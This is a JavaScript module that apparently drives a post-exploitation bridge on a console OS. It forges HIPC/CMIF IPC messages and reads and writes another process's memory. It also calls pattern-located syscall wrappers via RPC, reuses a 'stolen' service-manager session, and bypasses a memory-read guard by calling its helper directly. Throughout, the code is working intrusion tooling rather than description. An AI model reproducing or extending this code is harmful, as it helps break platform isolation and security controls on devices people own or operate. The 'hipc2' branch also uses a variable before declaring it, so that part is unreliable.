// Ordinary client IPC, serialized with the existing retained memory runner.
const fs = require('node:fs/promises');
const path = require('node:path');
const crypto = require('node:crypto');
const {check} = require("../memory/session.cjs");
const source = require('node:fs').readFileSync(__filename);
const sha256 = crypto.createHash('sha256').update(source).digest('hex');

async function dispatch(context, request) {
  const {s, live, report, save} = context;
  const domain = require(path.join(__dirname, '../app/domain.cjs'));
  const state = report.nativeRo ||= {session: live.session, notifiers: [], events: [], calls: []};
  if (!state.sources?.some(item => item.sha256 === sha256)) {
    const sourceFile = path.join(__dirname, 'control-' + sha256.slice(0, 12) + '.cjs');
    await fs.writeFile(sourceFile, source, {mode: 0o600});
    (state.sources ||= []).push({sha256, sourceFile});
    await save();
  }
  const command = request.command.slice('root-native-'.length);
  if (command === 'info') return {...state, ownedBase: s.base, ownedBytes: s.bytes};
  check(await s.ready(), 'Current native bridge is not ready');
  if (command === 'pm-exceptions') {
    const handle = state.services.find(item => item.name === 'pm:dmnt')?.handle;
    check(s.handles.has(handle), 'The owned PM monitor is missing');
    const output = s.base + 0x4000, size = 0x200;
    await s.write(output, Buffer.alloc(size));
    const reply = await s.ipc('RO process exception check', handle, 0, Buffer.alloc(0),
      {receive: [{address: output, size}]});
    check(!reply.result, 'PM exception enumeration failed');
    const count = reply.data.readUInt32LE();
    check(count <= size / 8, 'PM exception count exceeds the output');
    const bytes = await s.readOwned(output, size), pids = [];
    for (let i = 0; i < count; i++) pids.push(bytes.readBigUInt64LE(i * 8).toString());
    const result = {at: new Date().toISOString(), count, pids};
    (state.exceptionChecks ||= []).push(result); await save();
    return result;
  }
  if (command === 'event-signal' || command === 'event-clear') {
    const handle = Number(request.handle);
    check(state.events.some(e => e.handle === handle) && s.handles.has(handle), 'Event operation requires an owned exported handle');
    const bytes = command === 'event-signal' ? '210200d4c0035fd6' : '410200d4c0035fd6';
    state.eventCode ||= {};
    if (!state.eventCode[command]) {
      const offset = 0x1582fc, code = await s.read(live.sdk + offset, 0x120);
      const found = code.indexOf(Buffer.from(bytes, 'hex'));
      check(found >= 0 && found % 4 === 0 && found === code.lastIndexOf(Buffer.from(bytes, 'hex')),
        'The native event syscall wrapper is not unique');
      state.eventCode[command] = {offset: offset + found, bytes};
    }
    await s.verifyCode(state.eventCode[command], command);
    const result = await s.rpc.call3(live.sdk + state.eventCode[command].offset, handle, 0, 0);
    const entry = {at: new Date().toISOString(), operation: command, handle, result};
    state.calls.push(entry); await save();
    return entry;
  }
  if (command === 'ncm-list-system')
    return require("./ncm.cjs").listSystem(context, request, state);
  if (command.startsWith('code-') || command.startsWith('file-') || command.startsWith('donor-') || command.startsWith('content-'))
    return require("./files.cjs").dispatch(context, request, state, domain);
  if (command.startsWith('worker-'))
    return require("./worker-control.cjs").dispatch(context, request, state, domain);
  if (command.startsWith('process-test-'))
    return require("./process-test.cjs").dispatch(context, request, state);
  if (command === 'locator-open') {
    const source = Number(request.handle);
    check([...(report.ownedRoot?.clones || []), ...state.notifiers].includes(source) && s.handles.has(source),
      'Only our root or notifier can be located through a temporary domain');
    const cloned = await domain.send(s, 'Clone owned object for location', source, domain.wire.control(2));
    const handle = domain.oneHandle(cloned);
    const entry = {at: new Date().toISOString(), handle, source, locator: true};
    (state.domainCopies ||= []).push(entry); await save();
    try {
      const converted = await domain.send(s, 'Convert locator clone to domain', handle, domain.wire.control(0));
      check(!converted.result, 'Locator domain conversion failed');
      entry.root = converted.data.readUInt32LE();
      check(entry.root > 0 && entry.root <= 0x4000, 'Locator ID exceeds the native domain capacity');
      await save();
      return entry;
    } catch (error) {
      await s.close(handle);
      state.domainCopies = state.domainCopies.filter(item => item.handle !== handle); await save();
      throw error;
    }
  }
  if (command === 'domain-open') {
    if (!state.inspectionDomain) {
      state.inspectionDomain = await domain.openDomain(s, 'RO pivot: owned inspection domain');
      await save();
    }
    return state.inspectionDomain;
  }
  if (command === 'domain-copy') {
    const handle = Number(request.handle), object = Number(request.object);
    check(state.inspectionDomain?.handle === handle && s.handles.has(handle),
      'Copy requires the owned inspection domain');
    const input = Buffer.alloc(4); input.writeUInt32LE(object);
    const reply = await domain.send(s, 'RO pivot: copy owned domain object', handle, domain.wire.control(1, input));
    const copy = domain.oneHandle(reply);
    const entry = {at: new Date().toISOString(), handle: copy, domainHandle: handle, object};
    (state.domainCopies ||= []).push(entry);
    await save();
    return entry;
  }
  if (command === 'notifier-open') {
    if (state.notifiers.length) return state;
    const root = report.ownedRoot?.clones[0];
    check(report.ownedRoot?.initialized && s.handles.has(root), 'Dedicated root is not retained');
    const reply = await s.ipc('RO pivot: OpenSystemDataUpdateEventNotifier', root, 510);
    const entry = {at: new Date().toISOString(), operation: command, result: reply.canonicalResult};
    state.calls.push(entry);
    await save();
    check(!reply.result, 'System-data notifier creation failed: ' + reply.canonicalResult);
    state.notifiers.push(domain.oneHandle(reply));
    await save();
    return state;
  }
  if (command === 'notifier-clones') {
    const count = Number(request.count);
    check(Number.isInteger(count) && count >= 1 && count <= 12 && state.notifiers.length,
      'Expected an existing notifier and clone count 1..12');
    while (state.notifiers.length < count) {
      const reply = await domain.send(s, 'RO pivot: clone notifier', state.notifiers[0], domain.wire.control(2));
      state.notifiers.push(domain.oneHandle(reply));
      await save();
    }
    while (state.notifiers.length > count) {
      await s.close(state.notifiers.at(-1));
      state.notifiers.pop();
      await save();
    }
    return {handles: state.notifiers};
  }
  if (command === 'notifier-event') {
    check(state.notifiers.length && s.handles.has(state.notifiers[0]), 'Notifier is not retained');
    const reply = await s.ipc('RO pivot: raw GetEventHandle', state.notifiers[0], 0);
    check(!reply.result && reply.copies.length === 1 && !reply.moves.length, 'Expected one copied handle');
    const entry = {at: new Date().toISOString(), handle: reply.copies[0]};
    state.events.push(entry);
    await save();
    return entry;
  }
  if (command === 'peek') {
    // Read SDK-relative bytes (svc wrapper block archaeology).
    const offset = Number(request.offset), bytes = Number(request.bytes ?? 0x400);
    check(Number.isInteger(offset) && offset >= 0 && offset < 0x10000000 &&
      Number.isInteger(bytes) && bytes > 0 && bytes <= 0x20000,
      'Peek requires a sane SDK-relative range');
    const data = await s.read(live.sdk + offset, bytes);
    const entry = {at: new Date().toISOString(), operation: command, offset, bytes: data.toString('hex')};
    state.calls.push(entry); await save();
    return entry;
  }
  if (command === 'hipc2') {
    // Full HIPC2 client replication (fw23): build the type-6 request in the
    // wave thread's TLS (message area TLS+0..0x100) and send with the plain
    // TLS svc (0x21), mirroring the native client path in tsec FUN_0000d0b0.
    const functions = require("../../shared/sdk-functions.json");
    const handle = Number(request.handle), id = Number(request.id);
    check(s.handles.has(handle) && Number.isInteger(id) && id >= 0 && id <= 0xffff,
      'HIPC2 requires a retained handle and 16-bit command');
    const payload = Buffer.from(request.hex || '', 'hex');
    check(payload.length <= 0xc0, 'HIPC2 payload too large');
    state.hipc2 ||= {};
    if (!state.hipc2.svc21) {
      const near = functions.send.offset - 8;
      const bytes = await s.read(live.sdk + near, 16);
      check(bytes.subarray(0, 8).toString('hex') === '210400d4c0035fd6',
        'svc 0x21 wrapper is not adjacent to send');
      state.hipc2.svc21 = {offset: near, bytes: '210400d4c0035fd6'};
    }
    await s.verifyCode(state.hipc2.svc21, 'svc 0x21 wrapper');
    if (!state.hipc2.svc36) {
      const offset = 0x158534;
      const bytes = (await s.read(live.sdk + offset, 8)).toString('hex');
      check(bytes === 'c10600d4c0035fd6', 'svc 0x36 wrapper differs');
      state.hipc2.svc36 = {offset, bytes};
    }
    await s.verifyCode(state.hipc2.svc36, 'svc 0x36 wrapper');
    // GetThreadContext3(current thread pseudo-handle 0xFFFF8000) -> context
    // with tpidrro (TLS base) — no mrs gadget needed.
    const ctxOut = s.base + 0x6000;
    await s.write(ctxOut, Buffer.alloc(0x200));
    const ctxResult = await s.rpc.call3(live.sdk + state.hipc2.svc36.offset, ctxOut, 0xFFFF8000, 0);
    let tls = 0;
    if (!ctxResult) {
      const ctx = await s.readOwned(ctxOut, 0x140);
      state.hipc2.context = ctx.toString('hex');
      // ThreadContext3: ... fp@0xE8 lr@0xF0 sp@0xF8 elr@0x100 pstate@0x108 tpidr@0x110 tpidrro@0x118
      tls = Number(ctx.readBigUInt64LE(0x118));
      check(Number.isSafeInteger(tls) && tls >= 2 ** 32 && (tls & 7) === 0,
        'Context tpidrro is not canonical: ' + tls);
    }
    check(!ctxResult || Number.isInteger(ctxResult), 'bad context result');
    if (ctxResult) {
      entry?.notes?.push?.('svc36 failed: ' + ctxResult.toString(16));
      check(false, 'GetThreadContext3 failed: 0x' + (ctxResult >>> 0).toString(16) +
        ' — current-thread pseudo-handle rejected or svc not permitted');
    }
    state.hipc2.tls = tls;
    const saved = await s.read(tls, 0x100);
    const msg = Buffer.alloc(0x100);
    msg.writeUInt32LE(6, 0);
    msg.writeUInt32LE(8, 4);
    msg.write('SFCI', 0x10);
    msg.writeUInt32LE(1, 0x14);
    msg.writeUInt32LE(id, 0x18);
    msg.writeUInt32LE(0, 0x1c);
    payload.copy(msg, 0x20);
    await s.write(tls, msg);
    const transport = await s.rpc.call3(live.sdk + state.hipc2.svc21.offset, handle, 0, 0);
    const raw = await s.read(tls, 0x100);
    await s.write(tls, saved);
    const entry = {at: new Date().toISOString(), operation: command, handle, id,
      transport, tls, raw: raw.toString('hex'), restored: true};
    if (!transport) {
      // Parse the reply frame: [tag][flags][...][SFCO][result][payload]
      entry.tag = raw.readUInt32LE();
      entry.flags = raw.readUInt32LE(4);
      let at2 = 8;
      const header = entry.flags;
      if (header >>> 31) {at2 += 4;}  // special/handles section marker
      // result typically follows the cmif out header; scan for SFCO.
      const sfxo = raw.indexOf(Buffer.from('SFCO', 'ascii'));
      if (sfxo >= 0 && sfxo % 4 === 0) {
        entry.result = raw.readUInt32LE(sfxo + 8);
        entry.canonicalResult = entry.result & 0x3fffff;
        entry.data = raw.subarray(sfxo + 16, sfxo + 16 + 0x20).toString('hex');
      }
    }
    state.calls.push(entry);
    await save();
    return entry;
  }
  if (command === 'sdk-open-service') {
    // Open a service through the payload's OWN sm session (the SDK getService
    // path), not the exported/stolen app sm. Sessions opened this way are
    // owned by the payload's process class (system-module class).
    const name = String(request.name || '');
    const handle = await s.openService(name);
    const entry = {at: new Date().toISOString(), operation: command, name, handle};
    state.calls.push(entry); await save();
    return entry;
  }
  if (command === 'stage') {
    // Write bytes into the monitor staging area (s.base + offset) so raw-ipc
    // x/send buffers can point at caller-prepared content (paths etc).
    const offset = Number(request.offset), hex = String(request.hex || '');
    check(Number.isInteger(offset) && offset >= 0 && offset + hex.length / 2 <= 0x1000000 &&
      /^([0-9a-fA-F]{2})*$/.test(hex), 'Stage requires a sane offset and hex bytes');
    const bytes = Buffer.from(hex, 'hex');
    await s.write(s.base + offset, bytes);
    const entry = {at: new Date().toISOString(), operation: command, offset, bytes: bytes.length};
    state.calls.push(entry); await save();
    return entry;
  }
  if (command === 'raw-ipc') {
    // HIPC2/TIPC-style request: word0 = (cmd << 4) | 1, then raw payload
    // words. Buffer descriptors are ordinary HIPC map-alias regions, so the
    // in-process send/IPC wrappers see the same framing they always do.
    // With request.bare the hex is the complete message written verbatim
    // (framing experiments); id is then only recorded.
    const handle = Number(request.handle), id = Number(request.id);
    if (request.bare) {
      check(s.handles.has(handle) && typeof request.hex === 'string' &&
        /^([0-9a-fA-F]{2})*$/.test(request.hex) && request.hex.length <= 512,
        'Bare raw IPC requires a retained handle and hex message');
      await s.write(s.base, Buffer.from(request.hex, 'hex'));
      const transport = await s.call('send', s.base,
        Number.isInteger(request.sendSize) && request.sendSize >= 0x10 && request.sendSize <= 4096 ?
        request.sendSize : 4096, handle);
      const entry = {at: new Date().toISOString(), operation: command, handle, id, transport, hex: request.hex};
      if (!transport) {
        const raw = await s.readOwned(s.base, 256);
        entry.raw = raw.toString('hex');
        entry.result = raw.readUInt32LE(Math.min(Number(request.replyResultAt || 4), 252));
        entry.canonicalResult = entry.result & 0x3fffff;
      }
      state.calls.push(entry);
      await save();
      return entry;
    }
    check(s.handles.has(handle) && Number.isInteger(id) && id >= 0 && id <= 0xffff,
      'Raw IPC requires a retained handle and a 16-bit command id');
    const payload = Buffer.from(request.hex || '', 'hex');
    check(payload.length <= 192 && payload.length % 4 === 0,
      'Raw IPC payload must be at most 192 bytes and word aligned');
    const bytes = Buffer.alloc(256);
    const opts = {};
    if (Array.isArray(request.receive)) opts.receive = request.receive.map(
      b => ({address: s.base + Number(b.offset), size: Number(b.size), mode: Number(b.mode ?? 1)}));
    if (Array.isArray(request.send)) opts.send = request.send.map(
      b => ({address: s.base + Number(b.offset), size: Number(b.size), mode: Number(b.mode ?? 1)}));
    if (Array.isArray(request.x)) opts.x = request.x.map(
      b => ({address: s.base + Number(b.offset), size: Number(b.size)}));
    const buffers = [...(opts.send || []), ...(opts.receive || [])];
    // HIPC message header (mirrors shared/ipc.cjs packet() framing). X
    // (pointer) descriptors sit in their own area first, counted in word0
    // bits 16-19, with word2 = descriptor index (counter stays zero).
    bytes.writeUInt32LE((4 | (opts.x?.length || 0) << 16 |
      (opts.send?.length || 0) << 20 | (opts.receive?.length || 0) << 24) >>> 0);
    bytes.writeUInt32LE(Math.ceil((8 + payload.length + 4) / 4) >>> 0, 4);
    let at = 8;
    for (let i = 0; i < (opts.x?.length || 0); i++) {
      const buffer = opts.x[i], a = BigInt(buffer.address), n = BigInt(buffer.size);
      bytes.writeUInt32LE(Number(n & 0xffffffffn), at);
      bytes.writeUInt32LE(Number(a & 0xffffffffn), at + 4);
      bytes.writeUInt32LE(i & 3, at + 8);
      at += 12;
    }
    for (const buffer of buffers) {
      const a = BigInt(buffer.address), n = BigInt(buffer.size);
      bytes.writeUInt32LE(Number(n & 0xffffffffn), at);
      bytes.writeUInt32LE(Number(a & 0xffffffffn), at + 4);
      bytes.writeUInt32LE(Number(BigInt(buffer.mode) | (a >> 36n) << 2n | (n >> 32n) << 24n |
        ((a >> 32n) & 15n) << 28n), at + 8);
      at += 12;
    }
    at = (at + 15) & ~15;
    check(at + 4 + payload.length <= bytes.length, 'Raw IPC payload exceeds message capacity');
    if (request.cmif) {
      // CMIF framing, mirroring shared/ipc.cjs packet(): SFCI magic, version
      // word left zero, command, token, then the payload words.
      check(at + 16 + payload.length <= bytes.length, 'Raw IPC payload exceeds message capacity');
      bytes.write('SFCI', at);
      bytes.writeUInt32LE(id >>> 0, at + 8);
      payload.copy(bytes, at + 16);
    } else {
      bytes.writeUInt32LE(((id << 4) | 1) >>> 0, at);
      payload.copy(bytes, at + 4);
    }
    await s.write(s.base, bytes);
    const transport = await s.call('send', s.base, 4096, handle);
    const entry = {at: new Date().toISOString(), operation: command, handle, id,
      transport, hex: payload.toString('hex')};
    if (!transport) {
      const raw = await s.readOwned(s.base, 256);
      entry.raw = raw.toString('hex');
      const tag = raw.readUInt32LE(), header = raw.readUInt32LE(4);
      let at2 = 8;
      const special = header >>> 31 ? raw.readUInt32LE(at2) : 0;
      if (header >>> 31) at2 += 4;
      entry.tag = tag; entry.payloadWords = header & 0x3ff;
      const copies = [], moves = [];
      if (header >>> 31 && !(special & 1)) {
        for (let i = 0; i < (special >>> 1 & 15); i++, at2 += 4) copies.push(raw.readUInt32LE(at2));
        for (let i = 0; i < (special >>> 5 & 15); i++, at2 += 4) moves.push(raw.readUInt32LE(at2));
      }
      entry.copies = copies; entry.moves = moves;
      entry.result = raw.readUInt32LE(at2); entry.canonicalResult = entry.result & 0x3fffff;
      at2 += 4;
      entry.data = raw.subarray(at2, Math.min(at2 + Math.max(0, (header & 0x3ff) - 1) * 4, 256)).toString('hex');
      if ((Array.isArray(request.receive) || Array.isArray(request.x)) && !entry.result) {
        entry.buffers = [];
        for (const b of [...(opts.receive || []), ...(opts.x || [])]) {
          try {entry.buffers.push((await s.readOwned(b.address, Math.min(b.size, 0x1000))).toString('hex'));}
          catch (e) {entry.buffers.push('');}
        }
      }
    }
    state.calls.push(entry);
    await save();
    return entry;
  }
  if (command === 'ipc') {
    const handle = Number(request.handle), id = Number(request.id);
    check(s.handles.has(handle) && Number.isInteger(id) && id >= 0 && id <= 0xffffffff,
      'IPC requires a retained handle and valid command');
    check(typeof request.hex === 'string' && /^(?:[0-9a-fA-F]{2})*$/.test(request.hex) &&
      request.hex.length <= 384, 'IPC input must be at most 192 hex-encoded bytes');
    // Optional pid-descriptor passthrough (SetCurrentProcess needs it) plus
    // buffer passthrough for receive/send map-alias regions. Addresses are
    // offsets relative to the monitor staging base (s.base); received
    // regions are read back into the reply for PC-side parsing.
    const opts = {};
    if (request.pid) opts.pid = true;
    if (Array.isArray(request.receive)) opts.receive = request.receive.map(
      b => ({address: s.base + Number(b.offset), size: Number(b.size), mode: Number(b.mode ?? 1)}));
    if (Array.isArray(request.send)) opts.send = request.send.map(
      b => ({address: s.base + Number(b.offset), size: Number(b.size), mode: Number(b.mode ?? 1)}));
    const reply = await s.ipc('RO pivot: client command ' + id, handle, id, Buffer.from(request.hex, 'hex'), opts);
    const entry = {at: new Date().toISOString(), operation: command, handle, id,
      result: reply.result, canonicalResult: reply.canonicalResult, copies: reply.copies,
      moves: reply.moves, hex: reply.data.toString('hex')};
    if (Array.isArray(request.receive) && !reply.result) {
      entry.buffers = [];
      for (const b of opts.receive) {
        try {entry.buffers.push((await s.readOwned(b.address, Math.min(b.size, 0x1000))).toString('hex'));}
        catch (e) {entry.buffers.push('');}
      }
    }
    state.calls.push(entry);
    await save();
    return entry;
  }
  if (command === 'fs-region-read') {
    // Direct read-helper path for fs-process MODULE regions. The pipeline's
    // guarded read rejects IPC-referenced regions — the wave's IPC ring lives
    // inside the big rodata blocks, so the guard blocks the very regions we
    // need. Calling the boot-proven helper (sdk+0x586fb0, the same function
    // behind every guarded read) into the scratch output buffer, then
    // fetching it with the retained heap read, skips only the IPC-reference
    // refusal. The OTHER guard checks are LIFECRITICAL and stay: reading an
    // execute-only page would fault the helper inside the fs process.
    const address = Number(request.address), length = Number(request.length);
    check(Number.isSafeInteger(address) && address >= 0x1000 && Number.isInteger(length) &&
      length > 0 && length <= 0x8000, 'Invalid region read span');
    const region = await s.rpc.query(address);
    const end = Number(region.address) + Number(region.size);
    if (!(Number(region.address) <= address && address + length <= end &&
        (region.permissions & 1) !== 0 && !region.attributes &&
        ![0, 1, 16].includes(region.type)))
      throw Error('Region is not readable module memory: ' + JSON.stringify({
        address: Number(region.address), size: Number(region.size),
        type: region.type, permissions: region.permissions,
        attributes: region.attributes, ipcReferences: region.ipcReferences}) +
        ' for 0x' + address.toString(16));
    const out = Number(live.scratch) + 0x4040;
    const result = await s.rpc.call3(live.sdk + 0x586fb0, out, address, length);
    check(result === 0, 'Read helper failed: 0x' + (result >>> 0).toString(16));
    const bytes = await s.read(out, length);
    check(bytes.length === length, 'Scratch fetch was truncated');
    state.calls.push({at: new Date().toISOString(), operation: command, address, length});
    await save();
    return {address, length, hex: bytes.toString('hex')};
  }
  if (command === 'owned-fetch') {
    // Fast bulk fetch of the owned fs-heap region via readOwned (the wave's
    // alias read — the same channel the CodeFS captures used for 32MB
    // files). The retained read (memory.read) takes 2+ min per 64KB on the
    // same addresses — never use it for bulk (the qpJIeS freeze).
    const address = Number(request.address), length = Number(request.length);
    check(Number.isSafeInteger(address) && Number.isInteger(length) &&
      length > 0 && length <= 0x10000, 'Invalid owned fetch span');
    const bytes = await s.readOwned(address, length);
    state.calls.push({at: new Date().toISOString(), operation: command, address, length});
    await save();
    return {address, length, hex: bytes.toString('hex')};
  }
  if (command === 'hipc2-sdk-send') {
    // HIPC2 via the fs SDK's OWN client sender — the OS code path.
    // The sender (pgl 0xb0f0 shape) builds the HIPC2 frame in the CALLING
    // THREAD'S OWN TLS and sends via svc 0x21. It only reads [x0+4] = the
    // raw session handle, so an 8-byte owned {0, handle} fake proxy is a
    // sufficient stand-in for a CmifProxy object. No workers, no synthetic
    // frames, no manual TLS writes — the sender does everything itself.
    const handle = Number(request.handle);
    check(s.handles.has(handle), 'SDK send requires a retained service handle');
    const cmd = Number(request.cmd), arg = BigInt(request.arg ?? 0);
    const noarg = request.shape === 'noarg';
    check(Number.isInteger(cmd) && cmd >= 0 && cmd <= 0xffff, 'Invalid command id');
    // 1. Locate the sender in the live SDK by byte pattern (read-only).
    //    Two variants (validated across 49/54 fw23 modules): the 1-arg
    //    sender (wc 0xA; mrs x19; tail mov x0,x2 @+0xdc) and the no-arg
    //    sender (wc 8; mrs x20; tail mov x0,x20 @+0x70).
    const SENDER = Buffer.from(noarg ?
      'c90080d2e803022a020440b974d03bd5ea0314aae803082af30301aa0901c0f2497501f849ed7c92' :
      'c90080d2e803022a020440b973d03bd5ea0313aae803082a4901c0f2497501f849ed7c926aca88d2', 'hex');
    // Collect ALL pattern hits, then verify each: the first hit in a module
    // can be a different sender variant (validated against 49 fw23 modules:
    // 44 pass with the first hit; 5 need a later hit).
    const hits = [];
    const scanRange = async (base, size, tag) => {
      for (let off = 0; off + SENDER.length <= size; off += 0x80000) {
        const len = Math.min(0x80000 + SENDER.length, size - off);
        const chunk = await s.read(base + off, len);
        let at = -1;
        while ((at = chunk.indexOf(SENDER, at + 1)) >= 0 && hits.length < 16)
          hits.push(base + off + at);
      }
    };
    // The senders live in module TEXT (validated across 49 fw23 modules),
    // not the SDK blob: scan the executor's main module text first, then
    // the SDK region.
    let mainSize = 0;
    try {
      const q = await s.rpc.query(live.main);
      mainSize = Math.min(Number(BigInt(q.address) + BigInt(q.size)) - live.main, 0x400000);
    } catch (e) { mainSize = 0; }
    if (mainSize > 0) await scanRange(live.main, mainSize, 'main');
    if (hits.length < 16) await scanRange(live.sdk, 0x5e1000, 'sdk');
    check(hits.length > 0, 'SDK sender pattern not found in main or sdk ranges');
    // The pattern lands at function+0x14. Verify each candidate (NEVER call
    // an unverified offset — RfKcA9 lesson): prologue + same-thread tail
    // (mov x0, x2 at +0xdc = the svc 0x21 path).
    let senderOffset = -1;
    for (const hit of hits) {
      const start = hit - 0x14;
      if (start < 0) continue;
      const shape = await s.read(live.sdk + start, 0xe0);
      const headOk = shape.subarray(0, 4).equals(Buffer.from('7f2303d5', 'hex'));
      const tailOk = noarg ? shape.subarray(0x70, 0x74).equals(Buffer.from('e00314aa', 'hex')) :
        shape.subarray(0xdc, 0xe0).equals(Buffer.from('e00302aa', 'hex'));
      if (headOk && tailOk) { senderOffset = start; break; }
    }
    check(senderOffset >= 0, 'SDK sender found but no candidate passed the shape verify (hits: ' +
      hits.map(h => '0x' + h.toString(16)).join(',') + ')');
    state.hipc2SenderOffset = senderOffset;
    state.hipc2SenderHits = hits;
    await save();
    // 3. The 7 executor TLS snapshot (before).
    const ringFile = path.join(__dirname, live.session + '-thread-ring.json');
    const ring = JSON.parse(require('node:fs').readFileSync(ringFile));
    const groups = new Map();
    for (const n of ring.nodes.filter(t => t.state === 3 && t.size === 0xc000 && t.argument === 0)) {
      if (!groups.has(n.entry)) groups.set(n.entry, []);
      groups.get(n.entry).push(n);
    }
    const matches = [...groups.values()].filter(rows => rows.length === 7);
    check(matches.length === 1, 'Thread ring has no unique API-worker group');
    const structs = matches[0].slice(0, 3);
    const vals = [];
    for (const node of structs) {
      const raw = await s.read(node.address, 0x1c0);
      const v = {};
      for (let o = 0; o + 8 <= 0x1c0; o += 8) {
        const x = raw.readBigUInt64LE(o);
        if (x > 0x10000n && x < 2n ** 40n && (x & 7n) === 0n) v[o] = x;
      }
      vals.push(v);
    }
    let tpidrOffset = -1;
    for (const key of Object.keys(vals[0])) {
      const off = Number(key);
      const row = vals.map(v => v[off]);
      if (row.some(x => x === undefined) || new Set(row.map(String)).size < 3) continue;
      const g1 = (await s.read(Number(row[0]) + 0x1f8, 8)).readBigUInt64LE();
      const g2 = (await s.read(Number(row[1]) + 0x1f8, 8)).readBigUInt64LE();
      if (g1 === g2 && g1 > 0x10000n && g1 < 2n ** 40n) { tpidrOffset = off; break; }
    }
    check(tpidrOffset >= 0, 'tpidr field not found');
    const tlsList = [];
    for (const node of matches[0]) {
      const raw = await s.read(node.address, 0x1c0);
      tlsList.push(Number(raw.readBigUInt64LE(tpidrOffset)));
    }
    const before = [];
    for (const tls of tlsList) before.push(await s.read(tls, 0x40));
    // 4. Fake proxy + THE CALL — the sender runs on an RPC executor, builds
    //    the frame in ITS OWN registered TLS, svc 0x21, parses the reply.
    const proxyAt = s.base + 0x2080;
    const proxy = Buffer.alloc(8); proxy.writeUInt32LE(handle, 4);
    await s.write(proxyAt, proxy);
    const result = await s.rpc.call3(live.sdk + senderOffset, proxyAt, Number(arg), cmd);
    // 5. Reply capture: diff the TLS snapshots.
    let sfcoFound = false, replyHex = '';
    for (let i = 0; i < tlsList.length; i++) {
      const after = await s.read(tlsList[i], 0x40);
      if (after.equals(before[i])) continue;
      replyHex = after.subarray(0, 0x40).toString('hex');
      if (after.slice(0x10, 0x14).toString() === 'SFCO') sfcoFound = true;
      break;
    }
    const entry = {at: new Date().toISOString(), operation: command, handle, cmd,
      senderOffset, result, sfcoFound, replyHex: replyHex.slice(0, 128)};
    state.calls.push(entry); await save();
    return {senderOffset, result, sfcoFound, replyHex};
  }
  if (command === 'sm-service') {
    const handle = Number(request.handle), name = request.name;
    check(s.handles.has(handle) && typeof name === 'string' && /^[a-z0-9:-]{1,8}$/.test(name),
      'SM lookup requires an owned handle and service name');
    const bytes = Buffer.alloc(256);
    bytes.writeUInt32LE(0x11); bytes.writeUInt32LE(2, 4); bytes.write(name, 8);
    await s.write(s.base, bytes);
    const transport = await s.call('send', s.base, 4096, handle);
    const entry = {at: new Date().toISOString(), operation: command, handle, name, transport};
    state.calls.push(entry);
    await save();
    if (transport) return entry;
    const raw = await s.readOwned(s.base, 256);
    entry.raw = raw.subarray(0, 64).toString('hex');
    await save();
    const first = raw.readUInt32LE(), second = raw.readUInt32LE(4);
    check((first >>> 16) === 0 && (second & 0x3ff) >= 1, 'Unexpected TIPC response descriptors');
    let at = 8;
    const copies = [], moves = [];
    if (second >>> 31) {
      const special = raw.readUInt32LE(at); at += 4;
      check(!(special & 1), 'Unexpected TIPC reply PID');
      for (let i = 0; i < (special >>> 1 & 15); i++, at += 4) copies.push(raw.readUInt32LE(at));
      for (let i = 0; i < (special >>> 5 & 15); i++, at += 4) moves.push(raw.readUInt32LE(at));
    }
    entry.result = raw.readUInt32LE(at);
    entry.canonicalResult = entry.result & 0x3fffff;
    entry.copies = copies; entry.moves = moves;
    for (const child of [...copies, ...moves]) if (child) s.handles.add(child);
    if (!entry.result) {
      check(!copies.length && moves.length === 1, 'SM did not return one moved service handle');
      (state.services ||= []).push({name, handle: moves[0], sm: handle});
    }
    await save();
    return entry;
  }
  if (command === 'close-handle') {
    const handle = Number(request.handle);
    check([...state.events, ...(state.domainCopies || []), ...(state.services || [])].some(item => item.handle === handle),
      'Only exported or copied local handles may be closed here');
    await s.close(handle);
    state.events = state.events.filter(item => item.handle !== handle);
    if (state.domainCopies) state.domainCopies = state.domainCopies.filter(item => item.handle !== handle);
    if (state.services) state.services = state.services.filter(item => item.handle !== handle);
    await save();
    return {closed: handle};
  }
  if (command === 'thread-id' || command === 'wait-zero' || command === 'process-info') {
    const handle = Number(request.handle);
    check(s.handles.has(handle), 'Syscall requires a retained local handle');
    const offset = command === 'thread-id' ? 0x15847c : command === 'wait-zero' ? 0x1583fc : 0x1584ac;
    const expected = command === 'thread-id' ? 'e00f1ff8a10400d4e20340f9410000f9ff430091c0035fd6' :
      command === 'wait-zero' ? 'e00f1ff8010300d4e20340f9410000b9ff430091c0035fd6' :
      'e00f1ff8210500d4e20340f9410000f9ff430091c0035fd6';
    await s.verifyCode({offset, bytes: expected}, command);
    const output = s.base + 0x1000;
    const input = Buffer.alloc(16); input.writeUInt32LE(handle, 8);
    await s.write(output, input);
    let result;
    if (command === 'thread-id') result = await s.rpc.call3(live.sdk + offset, output, handle, 0);
    else if (command === 'wait-zero') result = await s.rpc.call4(live.sdk + offset, output, output + 8, 1, 0);
    else {
      const type = Number(request.type);
      check(Number.isInteger(type) && type >= 0 && type <= 31, 'Invalid process-info type');
      result = await s.rpc.call4(live.sdk + offset, output, type, handle, 0);
    }
    const value = (await s.readOwned(output, 8)).readBigUInt64LE().toString();
    const entry = {at: new Date().toISOString(), operation: command, handle, result, value};
    state.calls.push(entry);
    await save();
    return entry;
  }
  throw Error('Unknown native RO command: ' + command);
}

module.exports = {dispatch};
